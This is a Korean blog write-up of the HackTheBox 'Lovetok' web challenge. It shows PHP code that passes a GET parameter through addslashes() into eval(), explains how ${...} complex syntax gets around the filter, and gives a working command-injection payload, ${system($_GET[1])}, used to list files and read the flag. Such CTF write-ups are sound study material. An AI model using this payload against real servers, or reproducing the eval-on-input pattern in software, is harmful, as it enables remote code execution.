---
title: '[Hackthebox] Lovetok'
author: hoppi
date: 2022-12-23 01:20:00 + 0100
categories: [Web]
tags: [hackthebox, lovetok, php]
---
**키워드: PHP, addslashes()**  
  
![describtion](../../../assets/img/2022-12-23/2022-12-23-description.png){: w="600" h="300" }  
# 코드 분석
***
index 관련 함수를 보면 format 파라미터를 통해 `TimeModel` 생성자의 인자 값을 전달한다. 그리고 `getTime` 함수를 호출한다.

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```   
{: file="TimeController.php" }

<br><br/>
생성자 부분을 보면 `$format` 변수를 `addslashes` 함수를 통해서 필터링을 해주고 `date` 함수의 인자 값으로 들어간다.
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));'); // strtotime -> 텍스트를 시간으로 변환 반환 값은 유닉스타임스탬프
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```
{: file="TimeModel.php" }  

# 취약점
***
## addslashes() bypass using complex Syntax
***  
`addslashes` 함수 우회를 통해서 [SQL Injection](https://www.securityidiots.com/Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html)을 할 수 있지만 이 문제와는 맞지 않는다. 바로 `complex syntax`을 이용하는 방법이다. 먼저 아래와 같이 작은따옴표와 큰따옴표로 둘러싸여 있을때 차이가 있다.
```shell
php > $a = 1;
php > echo 'a is $a';
a is $a
php > echo "a is $a";
a is 1 
```
<br><br/>
또한 아래와 같이 내가 원하는 값은 `'bad'` 인데 그것을 표현하기 위해 `complex syntax`를 아래와 같이 이용할 수 있다.
```shell
php > $abc='ba';
php > echo "$abcd";
PHP Warning:  Undefined variable $abcd in php shell code on line 1

php > echo "${abc}d";
bad
```

<br><br/>
그리고 이런식의 중괄호 안에 함수가 들어갈 수 있는데 <u>먼저 함수를 실행한 뒤</u>, 함수에서 반환되는 값을 변수 이름으로 설정하고 값 할당이 가능해진다. (phpinfo 함수가 먼저 실행된 모습)
```shell
php > var_dump(${phpinfo()}=123);

...

PHP Quality Assurance Team
Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra, Stanislav Malyshev, Julien Pauli, Stephen Zarkos, Anatol Belski, Remi Collet, Ferenc Kovacs

                     Websites and Infrastructure team
PHP Websites Team => Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen, Peter Cowburn, Adam Harvey, Ferenc Kovacs, Levi Morrison
Event Maintainers => Damien Seguy, Daniel P. Brown
Network Infrastructure => Daniel P. Brown
Windows Infrastructure => Alex Schoenmaker

PHP License
This program is free software; you can redistribute it and/or modify
it under the terms of the PHP License as published by the PHP Group
and included in the distribution in the file:  LICENSE

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

If you did not receive a copy of the PHP license, or have any
questions about PHP licensing, please contact license@php.net.

int(123) 
php > var_dump($a=123);
int(123)
```


# Exploit
***
`eval` 함수를 통해서 `date` 함수를 이용하는데 첫 번째 파라미터는 string 형태의 `$format` 인데 만약 일치하는 [포맷](https://www.w3schools.com/php/func_date_date.asp)이 없으면 그대로 출력하는 것을 볼 수 있다. (A → AM을 나타냄)  
그렇기 때문에 `complex syntax`를 이용하여 `${system()}` 처럼 `system` 함수가 먼저 실행되게 하여  명령어 결과를 볼 수 있다.  
![describtion](../../../assets/img/2022-12-23/2022-12-23-am.png){: w="600" h="300" }
_/?format=A$$$_  
<b></b>
따라서 다음과 같은 페이로드가 가능하다. <u>하지만 따옴표는 기본적으로 addslashes 함수에 걸리기 때문에 사용할 수 없어서 1이라는 파라미터를 따로 설정하여 명령어를 system 함수의 인자로 넣어줘야한다.</u>
```
/?format=${system($_GET[1])}&1=ls%20-al
```    
![describtion](../../../assets/img/2022-12-23/2022-12-23-ls.png){: w="600" h="300" }
_/?format=${system($_GET[1])}&1=cat%20/ls%20-al%20/_


![describtion](../../../assets/img/2022-12-23/2022-12-23-flag.png){: w="600" h="300" }
_/?format=${system($_GET[1])}&1=cat%20/flag*_  


# Reference
***
- https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php